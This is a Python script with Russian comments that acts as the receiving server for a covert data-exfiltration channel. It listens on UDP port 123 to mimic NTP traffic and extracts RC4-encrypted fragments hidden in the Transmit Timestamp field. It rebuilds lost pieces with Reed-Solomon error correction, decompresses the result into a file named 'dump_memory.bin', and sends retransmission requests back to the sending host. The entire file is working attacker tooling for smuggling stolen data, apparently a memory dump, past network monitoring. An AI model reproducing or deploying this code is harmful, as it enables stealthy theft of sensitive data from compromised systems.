#!/usr/bin/env python3
import socket
import struct
import sys
import zlib
import logging
import time

# --- Параметры ---
BLOCK_SIZE = 10         # Количество фрагментов данных в блоке для RS
FRAGMENT_SIZE = 2       # Каждый фрагмент содержит 2 полезных байта
RC4_KEY = b"MySecretKey"  # Та же ключ, что и у клиента

# Таймаут и размер буфера
BASE_TIMEOUT = 120
SOCKET_RCVBUF_SIZE = 1 << 20

# Настройка логирования (системные сообщения на английском)
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

# --- Инициализация GF(256) для Reed-Solomon ---
GF_EXP = [0] * 512
GF_LOG = [0] * 256

def init_gf():
    # Инициализация экспоненциального и логарифмического массивов в GF(256)
    x = 1
    for i in range(255):
        GF_EXP[i] = x
        GF_LOG[x] = i
        x <<= 1
        if x & 0x100:
            x ^= 0x11d
    for i in range(255, 512):
        GF_EXP[i] = GF_EXP[i - 255]

init_gf()

def gf_mul(a, b):
    # Умножение в GF(256)
    if a == 0 or b == 0:
        return 0
    return GF_EXP[(GF_LOG[a] + GF_LOG[b]) % 255]

def gf_inv(a):
    # Вычисление обратного элемента в GF(256)
    if a == 0:
        raise ZeroDivisionError("Обратное значение для 0 в GF(256) не существует")
    return GF_EXP[255 - GF_LOG[a]]

# --- Функции RC4 ---
def rc4_init(key):
    # Инициализация состояния RC4 с использованием ключа
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S

def rc4_stream(S, length):
    # Генерация RC4-потока нужной длины
    i = j = 0
    stream = []
    for _ in range(length):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        stream.append(S[(S[i] + S[j]) % 256])
    return stream

def rc4_decrypt(encrypted, key, skip):
    # Расшифровка RC4 после пропуска 'skip' байт
    S = rc4_init(key)
    _ = rc4_stream(S, skip)
    keystream = rc4_stream(S, len(encrypted))
    return bytes([b ^ k for b, k in zip(encrypted, keystream)])

def try_decrypt(encrypted, key, skip):
    # Попытка расшифровать и извлечь 32-битное значение
    decrypted = rc4_decrypt(encrypted, key, skip)
    val = struct.unpack(">I", decrypted)[0]
    return val, decrypted

def deduce_skip(encrypted, key, total_fragments, is_fec=False):
    # Определение количества байт для пропуска (skip), чтобы корректно расшифровать пакет
    for skip in range(256):
        val, _ = try_decrypt(encrypted, key, skip)
        if not is_fec:
            # Для пакетов с данными, номер последовательности (старшие 16 бит) должен быть меньше, чем total_fragments
            if (val >> 16) < total_fragments:
                return skip, val
        else:
            # Для FEC-пакетов, номер (вычисленный на стороне клиента) должен быть больше или равен total_fragments
            if (val >> 16) >= total_fragments:
                return skip, val
    return None, None

# --- Декодирование RS (метод Гаусса в GF(256)) ---
def rs_solve(equations, k):
    # equations — список кортежей (строка, y), где строка — список из k коэффициентов, y — значение
    n = len(equations)
    # Построение копии расширенной матрицы A|b
    A = [list(eq[0]) + [eq[1]] for eq in equations]
    for col in range(k):
        pivot_row = None
        for row in range(col, n):
            if A[row][col] != 0:
                pivot_row = row
                break
        if pivot_row is None:
            raise ValueError("Система вырождена, недостаточно независимых уравнений")
        A[col], A[pivot_row] = A[pivot_row], A[col]
        inv_val = gf_inv(A[col][col])
        for j in range(col, k+1):
            A[col][j] = gf_mul(A[col][j], inv_val)
        for row in range(n):
            if row != col and A[row][col] != 0:
                factor = A[row][col]
                for j in range(col, k+1):
                    A[row][j] ^= gf_mul(factor, A[col][j])
    solution = [A[i][k] for i in range(k)]
    return solution

def build_equations(block_data, fec_data, k_block, pos):
    # Построение уравнений для заданного блока для позиции (0 = старший байт, 1 = младший байт)
    equations = []
    for i in range(k_block):
        if i in block_data:
            row = [0] * k_block
            row[i] = 1
            y = block_data[i][pos]
            equations.append((row, y))
    for j in fec_data:
        row = [GF_EXP[(i * (j+1)) % 255] for i in range(k_block)]
        y = fec_data[j][pos]
        equations.append((row, y))
    return equations

def rs_decode_block(block_data, fec_data, k_block):
    # Декодирование RS блока по двум позициям и восстановление отсутствующих фрагментов
    eq = build_equations(block_data, fec_data, k_block, pos=0)
    if len(eq) < k_block:
        raise ValueError("Недостаточно уравнений для решения RS")
    sol0 = rs_solve(eq[:k_block], k_block)
    
    eq = build_equations(block_data, fec_data, k_block, pos=1)
    sol1 = rs_solve(eq[:k_block], k_block)
    recovered = {}
    for i in range(k_block):
        if i not in block_data:
            recovered[i] = bytes([sol0[i], sol1[i]])
    return recovered

# --- Прием и сборка дампа ---
def run_receiver(host, port, output_file, base_timeout=120):
    # Создание UDP-сокета
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((host, port))
    except Exception as e:
        logging.error(f"Ошибка привязки к порту {port}: {e}")
        sys.exit(1)
    sock.settimeout(5)
    logging.info(f"Прослушивание на {host}:{port} ...")
    
    header_received = False
    total_fragments = 0
    total_size = 0
    data_packets = {}   # Словарь: глобальный номер -> 2 байта
    fec_packets = {}    # Словарь: (номер блока, индекс в блоке) -> 2 байта
    start_time = time.time()
    sender_addr = None

    logging.info("Ожидание заголовка...")
    while True:
        try:
            data, addr = sock.recvfrom(1024)
        except socket.timeout:
            if time.time() - start_time > base_timeout:
                logging.warning("Достигнут глобальный тайм-аут, остановка приема.")
                break
            continue

        if sender_addr is None:
            sender_addr = addr

        if len(data) < 48:
            continue

        # Извлечение полезной нагрузки из поля Transmit Timestamp (8 байт)
        payload = data[40:48]
        if not header_received:
            total_fragments = struct.unpack(">I", payload[:4])[0]
            total_size = struct.unpack(">I", payload[4:8])[0]
            header_received = True
            logging.info(f"Заголовок получен: {total_fragments} фрагментов, {total_size} сжатых байт.")
            continue

        encrypted = payload[4:8]
        skip, val = deduce_skip(encrypted, RC4_KEY, total_fragments, is_fec=False)
        if skip is not None:
            seq = val >> 16
            frag = val & 0xFFFF
            data_packets[seq] = frag.to_bytes(2, 'big')
            # Обновление информации о процессе приема
            progress = (len(data_packets) / total_fragments) * 100
            logging.info(f"Прогресс: {len(data_packets)}/{total_fragments} фрагментов получено ({progress:.1f}%)")
        else:
            skip, val = deduce_skip(encrypted, RC4_KEY, total_fragments, is_fec=True)
            if skip is not None:
                fec_seq = val
                seq_high = fec_seq >> 16
                block_index = seq_high // BLOCK_SIZE
                idx_in_block = seq_high % BLOCK_SIZE
                fec_packets[(block_index, idx_in_block)] = (fec_seq & 0xFFFF).to_bytes(2, 'big')
                logging.info(f"Получен FEC-пакет: блок {block_index}, индекс {idx_in_block}")
            else:
                logging.warning("Не удалось определить количество байт для пропуска; пакет пропускается.")

        if len(data_packets) == total_fragments:
            logging.info("Все пакеты с данными получены.")
            break

    sock.close()
    logging.info(f"Прием завершен: получено {len(data_packets)}/{total_fragments} пакетов с данными.")

    # Сборка дампа по блокам
    num_blocks = (total_fragments + BLOCK_SIZE - 1) // BLOCK_SIZE
    reconstructed = bytearray(total_fragments * FRAGMENT_SIZE)
    
    logging.info("Восстановление дампа ...")
    # Вывод индикатора прогресса через stdout
    bar_length = 30
    for b in range(num_blocks):
        block_start = b * BLOCK_SIZE
        k_block = min(BLOCK_SIZE, total_fragments - block_start)
        block_data_pos0 = {}
        block_data_pos1 = {}
        for i in range(k_block):
            seq = block_start + i
            if seq in data_packets:
                val = data_packets[seq]
                block_data_pos0[i] = val[0:1]
                block_data_pos1[i] = val[1:2]
        block_fec_pos0 = {}
        block_fec_pos1 = {}
        for j in range(BLOCK_SIZE):
            key = (b, j)
            if key in fec_packets:
                val = fec_packets[key]
                block_fec_pos0[j] = val[0:1]
                block_fec_pos1[j] = val[1:2]
        if len(block_data_pos0) < k_block:
            try:
                recovered0 = rs_decode_block(block_data_pos0, block_fec_pos0, k_block)
                recovered1 = rs_decode_block(block_data_pos1, block_fec_pos1, k_block)
                for i in range(k_block):
                    if i not in block_data_pos0:
                        d0 = recovered0[i][0]
                        d1 = recovered1[i][0]
                        data_packets[block_start + i] = bytes([d0, d1])
                        logging.info(f"Восстановлен отсутствующий фрагмент {block_start + i} с помощью RS.")
            except Exception as e:
                logging.error(f"Ошибка RS-декодирования для блока {b}: {e}")
        for i in range(k_block):
            seq = block_start + i
            frag = data_packets.get(seq, b'\x00\x00')
            reconstructed[seq*2:seq*2+2] = frag
        
        # Вывод обновленной полосы прогресса
        progress = ((b + 1) / num_blocks) * 100
        filled_length = int(bar_length * (b + 1) / num_blocks)
        bar = "=" * filled_length + "-" * (bar_length - filled_length)
        sys.stdout.write(f"\r[Восстановление] [{bar}] {progress:5.1f}%")
        sys.stdout.flush()
    sys.stdout.write("\n")
    
    reconstructed = reconstructed[:total_size]
    try:
        dump_data = zlib.decompress(reconstructed)
        with open(output_file, "wb") as f:
            f.write(dump_data)
        logging.info(f"Дамп распакован и сохранен в '{output_file}'.")
    except Exception as e:
        logging.error(f"Ошибка распаковки: {e}")
        with open(output_file + ".compressed", "wb") as f:
            f.write(reconstructed)
        logging.info(f"Сжатый дамп сохранен в '{output_file}.compressed'.")
    
    # Отправка обратной связи для отсутствующих фрагментов, если они есть
    missing_fragments = [i for i in range(total_fragments) if i not in data_packets]
    if missing_fragments and sender_addr:
        logging.info(f"Отсутствующие фрагменты после RS: {missing_fragments}")
        feedback = struct.pack(">I", len(missing_fragments))
        for seq in missing_fragments:
            feedback += struct.pack(">I", seq)
        feedback_port = 124
        fb_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            fb_sock.sendto(feedback, (sender_addr[0], feedback_port))
            logging.info(f"Обратная связь отправлена на {sender_addr[0]}:{feedback_port}")
        except Exception as e:
            logging.error(f"Ошибка при отправке обратной связи: {e}")
        finally:
            fb_sock.close()

if __name__ == '__main__':
    host = "0.0.0.0"      # Прослушивание на всех интерфейсах
    port = 123            # UDP-порт, имитирующий трафик NTP (обратите внимание: на Linux этот порт зарезервирован и может требовать прав root)
    output_file = "dump_memory.bin"
    run_receiver(host, port, output_file)
